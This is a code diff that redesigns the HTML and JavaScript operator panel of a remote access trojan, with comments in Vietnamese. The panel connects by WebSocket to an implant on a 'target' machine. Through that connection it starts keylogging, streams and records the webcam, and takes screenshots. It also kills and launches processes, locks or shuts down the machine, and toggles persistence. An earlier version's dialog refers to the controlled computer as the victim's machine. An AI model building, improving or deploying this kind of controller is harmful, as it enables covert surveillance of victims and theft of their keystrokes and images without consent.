@@ -3,424 +3,446 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RAT Web Controller Final</title>
+    <title>RAT COMMAND CENTER</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
     <style>
-        /* BASE STYLES */
-        body { background-color: #f8f9fa; }
-        .card { border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-bottom: 20px; }
-        .btn-group { margin-top: 10px; }
-
-        /* KEYLOGGER & PROCESS LIST */
-        #keylog-output { 
-            height: 250px; 
-            overflow-y: scroll; 
-            font-family: monospace; 
-            font-size: 0.9em; 
-            background: #fff; 
-            border: 1px solid #dee2e6; 
-            padding: 10px; 
-            white-space: pre-wrap; /* Quan trọng cho Keylog */
+        :root {
+            --bg-body: #1e1e20;
+            --bg-panel: #2b2b2e;
+            --bg-input: #38383b;
+            --border-color: #444;
+            --text-main: #e1e1e1;
+            --text-muted: #b0b0b0;
+            --accent: #3b82f6;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --key-badge-bg: #3f3f46;
+            --key-badge-text: #67e8f9;
         }
-        #process-list-output { max-height: 250px; overflow-y: auto; background: #fff; padding: 10px; border: 1px solid #dee2e6; border-radius: 5px; font-size: 0.85em; }
-        
-        /* WEBCAM FEED */
-        #webcam-feed { max-width: 100%; height: auto; border: 1px solid #000; display: block; margin-top: 10px; }
 
-        /* FEEDBACK AREA */
-        #immediate-feedback {
-            padding: 15px;
-            margin-bottom: 20px;
+        body {
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            font-family: 'Roboto', sans-serif;
+            font-size: 14px;
+        }
+
+        /* --- Panel Styles --- */
+        .glass-panel {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-color);
             border-radius: 8px;
-            font-weight: bold;
-            display: none;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
         }
-        .feedback-success { background-color: #d1e7dd; color: #0f5132; border: 1px solid #badbcc; }
-        .feedback-error { background-color: #f8d7da; color: #842029; border: 1px solid #f5c2c7; }
-        .feedback-info { background-color: #cff4fc; color: #055160; border: 1px solid #b6effb; }
+
+        .panel-header {
+            font-weight: 600;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+            color: var(--accent);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* --- Terminal / List Views --- */
+        .terminal {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: #151517;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 10px;
+            color: #d4d4d4;
+            font-size: 0.8rem; /* Font vừa phải, dễ đọc */
+            overflow-y: auto;
+            
+            /* Cố định chiều ngang, tự động xuống dòng */
+            white-space: pre-wrap;       /* Giữ định dạng xuống dòng, khoảng trắng */
+            word-wrap: break-word;       /* Bẻ từ dài xuống dòng */
+            overflow-x: hidden;          /* Ẩn thanh cuộn ngang */
+        }
+        
+        #process-list-output { 
+            height: 300px; 
+            color: #81a1c1; 
+            border-left: 2px solid var(--accent);
+        }
+        
+        #keylog-output { 
+            height: 220px; 
+            border-left: 2px solid var(--success);
+            line-height: 1.6; /* Tăng khoảng cách dòng cho thoáng */
+        }
+
+        /* --- [NEW] KEYLOGGER BADGE STYLING --- */
+        /* Style cho các phím đặc biệt nằm trong ngoặc [...] */
+        .key-badge {
+            display: inline-block;
+            background-color: var(--key-badge-bg);
+            color: var(--key-badge-text);
+            padding: 0px 6px;
+            border-radius: 4px;
+            border: 1px solid #52525b;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin: 0 2px;
+            vertical-align: middle;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+        
+        /* Riêng phím ENTER cho nổi bật hơn */
+        .key-enter {
+            color: var(--warning);
+            border-color: var(--warning);
+            margin-bottom: 4px; /* Tạo khoảng cách khi xuống dòng */
+        }
+
+        .process-item {
+            padding: 2px 0;
+            border-bottom: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
+        }
+        .process-name { font-weight: bold; color: #e1e1e1; }
+        .process-pid { color: #888; }
+
+        /* --- Scrollbar --- */
+        .terminal::-webkit-scrollbar { width: 8px; }
+        .terminal::-webkit-scrollbar-track { background: #1e1e1e; border-radius: 4px; }
+        .terminal::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; border: 1px solid #1e1e1e; }
+
+        /* --- Inputs & Buttons --- */
+        .form-control {
+            background-color: var(--bg-input); border: 1px solid var(--border-color); color: #fff; font-size: 0.85rem;
+        }
+        .form-control:focus {
+            background-color: #454548; border-color: var(--accent); color: #fff; box-shadow: none;
+        }
+        .form-control::placeholder { color: #888; opacity: 1; }
+        .btn-sm { font-size: 0.75rem; padding: 0.3rem 0.6rem; }
+        
+        /* --- Media --- */
+        .media-container {
+            background: #000; border: 1px solid var(--border-color); border-radius: 4px;
+            min-height: 240px; display: flex; align-items: center; justify-content: center;
+            overflow: hidden; margin-top: 10px;
+        }
+        #webcam-feed { width: 100%; object-fit: contain; }
+
+        /* --- Toast Notification --- */
+        #toast-box {
+            position: fixed; top: 20px; right: 20px; z-index: 9999;
+            background: #2b2b2e; border-left: 4px solid; color: #fff;
+            padding: 12px 16px; border-radius: 4px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            display: none; font-size: 0.85rem; font-weight: 500;
+        }
+        .label-text { font-size: 0.7rem; color: var(--text-muted); margin-bottom: 4px; display: block; font-weight: 600; }
     </style>
 </head>
 <body>
-    <div class="container mt-4">
-        <h1 class="text-center mb-4 text-primary">RAT Server Control Panel</h1>
-        
-        <div class="card p-3 mb-4 bg-light">
-            <h5>Trạng thái Kết nối: 
-                <span id="ws-status" class="badge bg-danger">DISCONNECTED</span>
-                <span id="keylog-status" class="badge bg-secondary ms-3">KEYLOGGER: Dừng</span>
-            </h5>
-            <div class="input-group mt-2">
-                <span class="input-group-text">IP:</span>
-                <input type="text" id="server-ip" class="form-control" value="{{ default_ip }}" placeholder="192.168.1.x">
-                <span class="input-group-text">Port:</span>
-                <input type="text" id="server-port" class="form-control" value="9002" style="max-width: 80px;">
-                <button class="btn btn-primary" onclick="connectManual()">Kết nối</button>
+
+    <div class="container-fluid border-bottom border-secondary py-2 mb-4" style="background: #232326;">
+        <div class="container d-flex justify-content-between align-items-center">
+            <h6 class="m-0 text-white font-monospace"><i class="fas fa-terminal me-2 text-accent"></i>RAT PANEL</h6>
+            
+            <div class="d-flex align-items-center gap-2">
+                <div class="input-group input-group-sm" style="width: auto;">
+                    <input type="text" id="server-ip" class="form-control" value="{{ default_ip }}" placeholder="Target IP" onkeypress="handleEnter(event, 'connect')">
+                    <button class="btn btn-primary" onclick="connectManual()"><i class="fas fa-plug"></i></button>
+                </div>
+                <span id="conn-status" class="badge bg-danger" style="font-size: 0.7rem;">OFFLINE</span>
             </div>
         </div>
-        
-        <div id="immediate-feedback" role="alert"></div>
+    </div>
 
+    <div id="toast-box"></div>
+
+    <div class="container">
         <div class="row">
-            <div class="col-md-6">
-                <div class="card p-4">
-                    <h4 class="card-title text-success">1. Quản Lý Hệ Thống & Tiến Trình</h4>
-                    
-                    <div class="btn-group mb-3">
-                        <button class="btn btn-outline-primary" onclick="sendCommand('LIST_PROC')">Xem Danh Sách Process</button>
+            <div class="col-lg-5">
+                <div class="glass-panel">
+                    <div class="panel-header">
+                        <span><i class="fas fa-server"></i> System</span>
+                        <button class="btn btn-link btn-sm p-0 text-decoration-none" style="color: var(--accent);" onclick="sendCommand('LIST_PROC')"><i class="fas fa-sync-alt"></i> Refresh</button>
                     </div>
 
-                    <h5 class="mt-4">Diệt Tiến Trình</h5>
-                    <div class="input-group mb-3">
-                        <input type="text" id="pid-input" class="form-control" placeholder="PID (số) hoặc Tên Process (e.g., chrome.exe)" onkeypress="handleEnterKey(event, 'kill')">
-                        <button class="btn btn-danger" onclick="killProcess()">Diệt Process</button>
-                    </div>
-                    
-                    <h5 class="mt-4">Khởi Chạy Ứng Dụng/Web</h5>
-                    <div class="input-group mb-3">
-                        <input type="text" id="app-input" class="form-control" placeholder="Tên App/Web (e.g., notepad, www.google.com)" onkeypress="handleEnterKey(event, 'start')">
-                        <button class="btn btn-success" onclick="startApp()">Mở App/Web</button>
-                    </div>
-                    
-                    <h5 class="mt-4">Tiến trình đang chạy:</h5>
-                    <div id="process-list-output">
-                        <p class="text-muted">Bấm "Xem Process" để tải danh sách...</p>
+                    <div id="process-list-output" class="terminal mb-3">
+                        <div class="text-center text-muted mt-5">Ready to scan...</div>
                     </div>
 
-                    <h5 class="mt-4">Tự Khởi Động (Persistence)</h5>
-                    <div class="btn-group w-100">
-                        <button class="btn btn-outline-success" onclick="sendCommand('PERSISTENCE', {mode: 'ON'})">Bật Tự Chạy</button>
-                        <button class="btn btn-outline-secondary" onclick="sendCommand('PERSISTENCE', {mode: 'OFF'})">Tắt Tự Chạy</button>
+                    <div class="row g-2 mb-2">
+                        <div class="col-9">
+                            <span class="label-text">TERMINATE PROCESS</span>
+                            <input type="text" id="pid-input" class="form-control form-control-sm" placeholder="PID / Name" onkeypress="handleEnter(event, 'kill')">
+                        </div>
+                        <div class="col-3 d-flex align-items-end">
+                            <button class="btn btn-outline-danger btn-sm w-100" onclick="killProcess()">Kill</button>
+                        </div>
+                    </div>
+
+                    <div class="row g-2 mb-4">
+                        <div class="col-9">
+                            <span class="label-text">EXECUTE APPLICATION</span>
+                            <input type="text" id="app-input" class="form-control form-control-sm" placeholder="App Name / URL" onkeypress="handleEnter(event, 'start')">
+                        </div>
+                        <div class="col-3 d-flex align-items-end">
+                            <button class="btn btn-outline-success btn-sm w-100" onclick="startApp()">Run</button>
+                        </div>
+                    </div>
+
+                    <span class="label-text">POWER CONTROL</span>
+                    <div class="d-flex gap-2 mb-2">
+                        <button class="btn btn-secondary btn-sm flex-grow-1" onclick="sendCommand('SYSTEM_CONTROL', {type: 'LOCK'})"><i class="fas fa-lock"></i> Lock</button>
+                        <button class="btn btn-secondary btn-sm flex-grow-1" onclick="sendCommand('SYSTEM_CONTROL', {type: 'RESTART'})"><i class="fas fa-redo"></i> Reboot</button>
+                        <button class="btn btn-secondary btn-sm flex-grow-1" onclick="sendCommand('SYSTEM_CONTROL', {type: 'SHUTDOWN'})"><i class="fas fa-power-off"></i> Off</button>
                     </div>
                     
-                    <h5 class="mt-4">Điều Khiển Nguồn</h5>
-                    <div class="btn-group">
-                        <button class="btn btn-warning" onclick="sendCommand('SYSTEM_CONTROL', {type: 'LOCK'})">Khóa Máy 🔒</button>
-                        <button class="btn btn-secondary" onclick="sendCommand('SYSTEM_CONTROL', {type: 'RESTART'})">Khởi Động Lại</button>
-                        <button class="btn btn-danger" onclick="sendCommand('SYSTEM_CONTROL', {type: 'SHUTDOWN'})">Tắt Máy</button>
+                    <div class="d-flex gap-2 mb-3">
+                        <button class="btn btn-dark btn-sm flex-grow-1 border border-secondary" onclick="sendCommand('PERSISTENCE', {mode: 'ON'})" title="Auto-Start"><i class="fas fa-check"></i> Persist ON</button>
+                        <button class="btn btn-dark btn-sm flex-grow-1 border border-secondary" onclick="sendCommand('PERSISTENCE', {mode: 'OFF'})"><i class="fas fa-times"></i> Persist OFF</button>
                     </div>
-                    <div class="d-grid gap-2 mt-4">
-                        <button class="btn btn-outline-danger fw-bold" onclick="killServer()">💀 HỦY DIỆT SERVER (Dừng Server App)</button>
-                        <small class="text-muted text-center">Lưu ý: Dùng để tắt file ServerApp.exe đang chạy ngầm.</small>
-                    </div>
+
+                    <button class="btn btn-danger w-100 btn-sm" style="opacity: 0.8;" onclick="killServer()"><i class="fas fa-skull"></i> KILL SERVER</button>
                 </div>
             </div>
 
-            <div class="col-md-6">
-                <div class="card p-4">
-                    <h4 class="card-title text-info">2. Theo Dõi & Đa Phương Tiện</h4>
-
-                    <h5 class="mt-3">Keylogger Log</h5>
-                    <div class="btn-group mb-3">
-                        <button id="btn-start-keylog" class="btn btn-success" onclick="startKeylogger()">Bật Keylogger</button>
-                        <button id="btn-stop-keylog" class="btn btn-danger" onclick="stopKeylogger()">Tắt Keylogger</button>
+            <div class="col-lg-7">
+                <div class="glass-panel">
+                    <div class="panel-header">
+                        <span><i class="fas fa-keyboard"></i> Keylogger</span>
+                        <div class="form-check form-switch">
+                            <input class="form-check-input" type="checkbox" id="keylogSwitch" onchange="toggleKeylogger(this.checked)">
+                            <label class="form-check-label small" for="keylogSwitch">Monitor</label>
+                        </div>
                     </div>
-                    <div id="keylog-output">Chờ lệnh START_KEYLOG...</div>
+                    <div id="keylog-output" class="terminal">_</div>
+                </div>
 
-                    <h5 class="mt-4">Media Control</h5>
-                    <button class="btn btn-primary mb-2" onclick="sendCommand('SCREENSHOT')">Chụp Màn Hình 📸</button>
-                    
-                    <div class="btn-group">
-                        <button class="btn btn-info" onclick="startWebcam()">Bật Live Stream</button>
-                        <button class="btn btn-danger" onclick="stopWebcam()">Tắt Stream</button>
-                        <button class="btn btn-warning" onclick="startRecord()">Ghi Hình 10s</button>
+                <div class="glass-panel">
+                    <div class="panel-header">
+                        <span><i class="fas fa-eye"></i> Visual</span>
+                        <span id="stream-status" class="badge bg-secondary" style="font-size: 0.65rem;">IDLE</span>
+                    </div>
+
+                    <div class="row g-2 mb-2">
+                        <div class="col-4">
+                            <button class="btn btn-primary btn-sm w-100" onclick="sendCommand('SCREENSHOT')"><i class="fas fa-camera"></i> Snap</button>
+                        </div>
+                        <div class="col-4">
+                            <button id="btn-stream" class="btn btn-outline-success btn-sm w-100" onclick="toggleWebcam()">
+                                <i class="fas fa-video"></i> Stream
+                            </button>
+                        </div>
+                        <div class="col-4">
+                            <button class="btn btn-outline-warning btn-sm w-100" onclick="startRecord()"><i class="fas fa-record-vinyl"></i> Rec 10s</button>
+                        </div>
                     </div>
                     
-                    <h5 class="mt-4">Live Webcam Feed:</h5>
-                    <img id="webcam-feed" src="" alt="Webcam Feed" class="img-fluid">
+                    <div class="media-container">
+                        <img id="webcam-feed" alt="" style="display:none;">
+                        <div id="media-placeholder" class="text-muted small">
+                            <i class="fas fa-video-slash fa-2x mb-2"></i><br>NO SIGNAL
+                        </div>
+                    </div>
                 </div>
             </div>
-        </div>
-
-        <div id="alert-output-container" style="display: none;">
-             <p id="alert-output"></p>
         </div>
     </div>
 
     <script>
-        const wsUrl = "{{ ws_url }}"; 
+        const wsUrlTemplate = "{{ ws_url }}"; 
         let ws;
         let isKeylogging = false;
         let isStreaming = false; 
-        const alertOutput = document.getElementById('alert-output'); // Giữ lại cho console log
-        const feedbackElement = document.getElementById('immediate-feedback');
+        const toastBox = document.getElementById('toast-box');
 
-        // --- HÀM A: HIỂN THỊ PHẢN HỒI TỨC THÌ ---
-        function displayFeedback(message, type) {
-            feedbackElement.textContent = message;
-            feedbackElement.className = `alert mt-2 feedback-${type}`;
-            feedbackElement.style.display = 'block';
-
-            setTimeout(() => {
-                feedbackElement.style.display = 'none';
-            }, 5000); 
-            
-            console.log(`[FEEDBACK] ${type.toUpperCase()}: ${message}`);
+        // --- UI UTILS ---
+        function showToast(msg, type='info') {
+            toastBox.textContent = msg;
+            toastBox.style.borderLeftColor = type === 'success' ? 'var(--success)' : (type === 'error' ? 'var(--danger)' : 'var(--accent)');
+            toastBox.style.display = 'block';
+            setTimeout(() => toastBox.style.display = 'none', 3000);
         }
 
-        // --- HÀM B: XỬ LÝ DOWNLOAD (CHO SCREENSHOT VÀ VIDEO) ---
-        function downloadBase64(base64Data, filename, mimeType) {
-            const link = document.createElement('a');
-            link.href = 'data:' + mimeType + ';base64,' + base64Data;
-            link.download = filename;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-
-        // --- HÀM C: XỬ LÝ NHẤN PHÍM ENTER (MỚI) ---
-        function handleEnterKey(event, action) {
-            if (event.key === 'Enter') {
-                event.preventDefault();
-                if (action === 'kill') {
-                    killProcess();
-                } else if (action === 'start') {
-                    startApp();
+        // [MỚI] Hàm định dạng Keylog: Biến các chuỗi [...] thành Badge đẹp
+        function formatKeylogData(rawData) {
+            // Regex tìm tất cả các chuỗi nằm trong ngoặc vuông []
+            // Thay thế bằng HTML span với class "key-badge"
+            let formatted = rawData.replace(/\[(.*?)\]/g, function(match, content) {
+                // Nếu là [ENTER] thì thêm style đặc biệt
+                if (content.includes("ENTER")) {
+                    return `<span class="key-badge key-enter">${content}</span>`;
                 }
+                return `<span class="key-badge">${content}</span>`;
+            });
+            return formatted;
+        }
+
+        function downloadFile(b64, name, mime) {
+            const a = document.createElement('a');
+            a.href = `data:${mime};base64,${b64}`; a.download = name; a.click();
+        }
+
+        function handleEnter(e, action) {
+            if(e.key === 'Enter') {
+                event.preventDefault();
+                if(action === 'kill') killProcess();
+                else if(action === 'start') startApp();
+                else if(action === 'connect') connectManual();
             }
         }
-        
-        // --- HÀM D: KẾT NỐI VÀ XỬ LÝ WEBSOCKET ---
+
+        // --- WEBSOCKET ---
         function connectManual() {
-            const ip = document.getElementById('server-ip').value;
-            const port = document.getElementById('server-port').value;
-            const url = `ws://${ip}:${port}`;
-            connectWebSocket(url);
+            const ip = document.getElementById('server-ip').value.trim();
+            if(!ip) return showToast("Nhập IP Target", "error");
+            connectWebSocket(`ws://${ip}:9002`);
         }
 
-        function connectWebSocket() {
-            if (ws) ws.close();
-
-            ws = new WebSocket(wsUrl);
-            const statusElement = document.getElementById('ws-status');
-            const keylogStatus = document.getElementById('keylog-status');
-
+        function connectWebSocket(url) {
+            if(ws) ws.close();
+            ws = new WebSocket(url);
+            
             ws.onopen = () => {
-                statusElement.textContent = 'CONNECTED';
-                statusElement.classList.remove('bg-danger', 'bg-warning');
-                statusElement.classList.add('bg-success');
-                displayFeedback("Kết nối WebSocket tới Server C++ thành công!", 'success');
+                document.getElementById('conn-status').textContent = 'CONNECTED';
+                document.getElementById('conn-status').className = 'badge bg-success';
+                showToast("Connected.", "success");
             };
-
-            ws.onerror = (error) => {
-                console.error("WebSocket Error:", error);
-            };
-
+            
             ws.onclose = () => {
-                statusElement.textContent = 'DISCONNECTED';
-                statusElement.classList.remove('bg-success', 'bg-warning');
-                statusElement.classList.add('bg-danger');
-                displayFeedback("Mất kết nối. Đang thử kết nối lại...", 'error');
-                
-                // Reset trạng thái
-                isKeylogging = false;
-                keylogStatus.textContent = 'KEYLOGGER: Dừng';
-                keylogStatus.classList.remove('bg-success');
-                keylogStatus.classList.add('bg-secondary');
-                
-                isStreaming = false;
-                document.getElementById('webcam-feed').src = "";
-                
-                setTimeout(connectWebSocket, 5000); 
+                document.getElementById('conn-status').textContent = 'DISCONNECTED';
+                document.getElementById('conn-status').className = 'badge bg-danger';
+                isKeylogging = false; document.getElementById('keylogSwitch').checked = false;
+                updateWebcamUI(false);
             };
+
+            ws.onerror = () => showToast("Connection Fail", "error");
 
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
-                const output = document.getElementById('keylog-output');
-                let feedbackType = 'info';
 
-                // 1. Xử lý Keylogger
-                if (data.type === 'KEYLOG_RESULT') {
-                    output.innerHTML += data.data; 
-                    output.scrollTop = output.scrollHeight; 
-                    if (isKeylogging) { 
-                        sendCommand('GET_KEYLOG');
+                if (data.type === 'LIST_RESULT') {
+                    let html = '';
+                    data.data.forEach(p => {
+                        let parts = p.split(' | ');
+                        html += `<div class="process-item">
+                                    <span class="process-name">${parts[0]}</span> 
+                                    <span class="process-pid">${parts[1]}</span>
+                                 </div>`;
+                    });
+                    document.getElementById('process-list-output').innerHTML = html;
+                    showToast(`Loaded ${data.data.length} tasks.`, "success");
+                }
+                else if (data.type === 'ACTION_RESULT') {
+                    showToast(data.msg, data.msg.includes("THẤT BẠI") ? "error" : "success");
+                    if(data.msg.includes("Stopping") || data.msg.includes("dung Webcam")) updateWebcamUI(false);
+                }
+                
+                // [MỚI] Xử lý hiển thị Keylog thông minh
+                else if (data.type === 'KEYLOG_RESULT') {
+                    const out = document.getElementById('keylog-output');
+                    const rawText = data.data;
+
+                    if (rawText) {
+                        // 1. Format đẹp (tạo badge)
+                        const niceHtml = formatKeylogData(rawText);
+                        
+                        // 2. Thêm vào khung (innerHTML để render thẻ span)
+                        out.innerHTML += niceHtml;
+
+                        // 3. Logic Smart Scroll (Sửa lỗi giật)
+                        // Chỉ tự cuộn nếu người dùng ĐANG ở dưới cùng
+                        const isScrolledToBottom = out.scrollHeight - out.clientHeight <= out.scrollTop + 50; // sai số 50px
+                        if (isScrolledToBottom) {
+                            out.scrollTop = out.scrollHeight;
+                        }
                     }
-                    return; 
+
+                    if(isKeylogging) sendCommand('GET_KEYLOG');
                 }
                 
-                // 2. Xử lý Ảnh Chụp Màn Hình (Tải file)
-                else if (data.type === 'SCREENSHOT_RESULT') {
-                    const b64 = data.data;
-                    const filename = `screenshot_${Date.now()}.jpeg`;
-                    
-                    document.getElementById('webcam-feed').src = ''; 
-                    downloadBase64(b64, filename, 'image/jpeg');
-                    displayFeedback(`Ảnh chụp màn hình đã được tải xuống (${filename}).`, 'success');
-                }
-                
-                // 3. Xử lý Live Webcam Frame
                 else if (data.type === 'CAM_FRAME') {
                     document.getElementById('webcam-feed').src = 'data:image/jpeg;base64,' + data.data;
-                    return; 
+                    if(!isStreaming) updateWebcamUI(true);
                 }
-                
-                // 4. Xử lý Process List
-                else if (data.type === 'LIST_RESULT') {
-                    const processData = data.data;
-                    const processListOutput = document.getElementById('process-list-output');
-                    
-                    let htmlContent = `<p class="fw-bold text-success">Tìm thấy ${processData.length} tiến trình:</p>`;
-                    
-                    processData.forEach(proc => {
-                        const parts = proc.split(' | ');
-                        const name = parts[0];
-                        const pid = parts[1];
-                        
-                        htmlContent += `<p class="mb-0"><strong>${name}</strong> (${pid})</p>`;
-                    });
-                    
-                    processListOutput.innerHTML = htmlContent;
-                    displayFeedback(`Đã nhận ${processData.length} tiến trình.`, 'success');
+                else if (data.type === 'SCREENSHOT_RESULT' || data.type === 'RECORD_RESULT') {
+                    const ext = data.type === 'RECORD_RESULT' ? 'avi' : 'jpg';
+                    downloadFile(data.data, `data_${Date.now()}.${ext}`, ext === 'avi' ? 'video/avi' : 'image/jpeg');
+                    showToast("Download started.", "success");
                 }
-                
-                // 5. Xử lý Kết Quả Hành Động (ACTION_RESULT) - CORE FEEDBACK
-                else if (data.type === 'ACTION_RESULT') {
-                    const msg = data.msg;
-                    
-                    if (msg.includes("THÀNH CÔNG") || msg.includes("Webcam Started") || msg.includes("Da diet") || msg.includes("hoan toan")) {
-                        feedbackType = 'success';
-                    } else if (msg.includes("THẤT BẠI") || msg.includes("Lỗi") || msg.includes("Khong tim thay")) {
-                        feedbackType = 'error';
-                    }
-                    else {
-                        feedbackType = 'info';
-                    }
-
-                    // Logic đồng bộ trạng thái webcam
-                    if (msg.includes("Webcam Stopping") || msg.includes("tat hoan toan")) {
-                        isStreaming = false;
-                        document.getElementById('webcam-feed').src = "";
-                        feedbackType = 'success'; // Đánh dấu thành công khi Server báo "hoàn toàn"
-                    }
-                    
-                    displayFeedback(msg, feedbackType);
-                }
-                
-                // 6. Xử lý Record Video (Tải file)
-                else if (data.type === 'RECORD_RESULT') {
-                    const b64 = data.data;
-                    const filename = `webcam_record_${Date.now()}.avi`;
-                    
-                    downloadBase64(b64, filename, 'video/avi');
-                    displayFeedback(`File Video đã được tải xuống (${filename}).`, 'success');
-                }
-                
-                console.log(`[SERVER LOG CHI TIẾT] ${JSON.stringify(data)}`);
             };
         }
 
-        // --- HÀM E: GỬI LỆNH JSON ---
-        function sendCommand(cmd, args = {}) {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                args.cmd = cmd;
-                ws.send(JSON.stringify(args));
+        function sendCommand(cmd, args={}) {
+            if(ws && ws.readyState === 1) { args.cmd = cmd; ws.send(JSON.stringify(args)); }
+            else showToast("No Connection", "error");
+        }
+
+        // --- UI HELPERS ---
+        function updateWebcamUI(active) {
+            isStreaming = active;
+            const btn = document.getElementById('btn-stream');
+            const status = document.getElementById('stream-status');
+            const img = document.getElementById('webcam-feed');
+            const placeholder = document.getElementById('media-placeholder');
+
+            if(active) {
+                btn.className = 'btn btn-danger btn-sm w-100';
+                btn.innerHTML = '<i class="fas fa-stop"></i> Stop';
+                status.textContent = "LIVE"; status.className = "badge bg-danger blink";
+                img.style.display = 'block'; placeholder.style.display = 'none';
             } else {
-                displayFeedback("LỖI: Mất kết nối. Đang thử kết nối lại...", 'error');
+                btn.className = 'btn btn-outline-success btn-sm w-100';
+                btn.innerHTML = '<i class="fas fa-video"></i> Stream';
+                status.textContent = "IDLE"; status.className = "badge bg-secondary";
+                img.style.display = 'none'; placeholder.style.display = 'block';
+                img.src = "";
             }
         }
 
-        // --- HÀM F: XỬ LÝ TƯƠNG TÁC BUTTON/ENTER ---
-        
         function killProcess() {
-            const target = document.getElementById('pid-input').value.trim();
-            if (!target) {
-                displayFeedback("[LỖI NHẬP] Vui lòng nhập PID hoặc Tên Process.", 'error');
-                return; 
-            }
-            const sanitizedTarget = target.replace(/[^a-zA-Z0-9.\s]/g, '').trim(); 
-            displayFeedback(`Đang gửi lệnh diệt Process: ${sanitizedTarget}...`, 'info');
-            
-            if (!sanitizedTarget) {
-                 displayFeedback("[LỖI] Ký tự không hợp lệ đã bị loại bỏ. Vui lòng nhập lại.", 'error');
-                 return;
-            }
-
-            if (isNaN(sanitizedTarget)) {
-                sendCommand('KILL_PROC', { proc_name: sanitizedTarget });
-            } else {
-                sendCommand('KILL_PROC', { pid: sanitizedTarget });
-            }
+            const val = document.getElementById('pid-input').value.trim();
+            if(val) { sendCommand('KILL_PROC', isNaN(val) ? {proc_name: val} : {pid: val}); document.getElementById('pid-input').value = ''; }
         }
 
         function startApp() {
-            const name = document.getElementById('app-input').value.trim();
-            if (!name) {
-                displayFeedback("[LỖI NHẬP] Vui lòng nhập tên ứng dụng/web.", 'error');
-                return; 
-            }
-            const sanitizedName = name.replace(/[^a-zA-Z0-9.\s]/g, '').trim(); 
-            displayFeedback(`Đang gửi lệnh khởi chạy: ${sanitizedName}...`, 'info');
-            sendCommand('START_PROC', { name: sanitizedName });
+            const val = document.getElementById('app-input').value.trim();
+            if(val) { sendCommand('START_PROC', {name: val}); document.getElementById('app-input').value = ''; }
         }
 
-        function startKeylogger() {
-            if (!isKeylogging) {
-                isKeylogging = true;
-                sendCommand('START_KEYLOG'); 
-                sendCommand('GET_KEYLOG'); 
-                document.getElementById('keylog-output').textContent = 'Keylogger đang hoạt động...\n\n';
-                document.getElementById('keylog-status').textContent = 'KEYLOGGER: Hoạt động';
-                document.getElementById('keylog-status').classList.remove('bg-secondary');
-                document.getElementById('keylog-status').classList.add('bg-success');
-                displayFeedback("Keylogger đã được kích hoạt. Đang theo dõi...", 'success');
-            }
+        function toggleKeylogger(state) {
+            isKeylogging = state;
+            if(state) { sendCommand('START_KEYLOG'); sendCommand('GET_KEYLOG'); showToast("Monitoring...", "success"); }
+            else showToast("Monitor Paused.");
         }
 
-        function stopKeylogger() {
-            isKeylogging = false;
-            document.getElementById('keylog-status').textContent = 'KEYLOGGER: Dừng';
-            document.getElementById('keylog-status').classList.remove('bg-success');
-            document.getElementById('keylog-status').classList.add('bg-secondary');
-            displayFeedback("Keylogger đã dừng theo dõi.", 'info');
-        }
-
-        function startWebcam() {
-            if (!isStreaming) {
-                isStreaming = true;
-                sendCommand('START_CAM');
-                displayFeedback("Đang yêu cầu Server bật Live Stream Webcam...", 'info');
-            } else {
-                displayFeedback("Webcam đã hoạt động. Vui lòng tắt trước khi Start lại.", 'info');
-            }
-        }
-
-        function stopWebcam() {
-            if (isStreaming) {
-                isStreaming = false; 
-                sendCommand('STOP_CAM');
-                // Gửi lệnh pending, Server sẽ xác nhận thành công sau khi join()
-                displayFeedback("Đã gửi lệnh dừng Webcam. Chờ Server xác nhận tắt hoàn toàn...", 'info');
-            }
+        function toggleWebcam() {
+            if(!isStreaming) { sendCommand('START_CAM'); showToast("Starting Stream...", "info"); }
+            else { sendCommand('STOP_CAM'); }
         }
 
         function startRecord() {
-            if (isStreaming) {
-                 displayFeedback("[LỖI] Vui lòng tắt Live Stream trước khi Ghi hình.", 'error');
-            } else {
-                 sendCommand('RECORD_CAM');
-                 displayFeedback("Đã gửi lệnh Ghi hình 10s. Vui lòng chờ file tải về...", 'info');
-            }
+            if(isStreaming) showToast("Stop Stream first!", "error");
+            else { sendCommand('RECORD_CAM'); showToast("Recording...", "info"); }
         }
 
         function killServer() {
-            if (confirm("CẢNH BÁO NGUY HIỂM!\n\nBạn có chắc chắn muốn tắt ứng dụng Server trên máy nạn nhân không?\n\nSau khi tắt, bạn sẽ KHÔNG THỂ kết nối lại được nữa trừ khi có người bật lại thủ công file .exe!")) {
-                displayFeedback("Đang gửi lệnh tự hủy tới Server...", 'error');
-                sendCommand('KILL_SERVER');
-                
-                // Cập nhật giao diện sau khi server chết
-                setTimeout(() => {
-                    document.getElementById('ws-status').textContent = 'DEAD';
-                    document.getElementById('ws-status').className = 'badge bg-dark';
-                    alert("Server đã xác nhận lệnh tự hủy. Kết nối đã ngắt vĩnh viễn.");
-                    // Vô hiệu hóa các nút để tránh bấm nhầm
-                    ws.close();
-                }, 2000);
-            }
+            if(confirm("Terminate Remote Server?")) sendCommand('KILL_SERVER');
         }
 
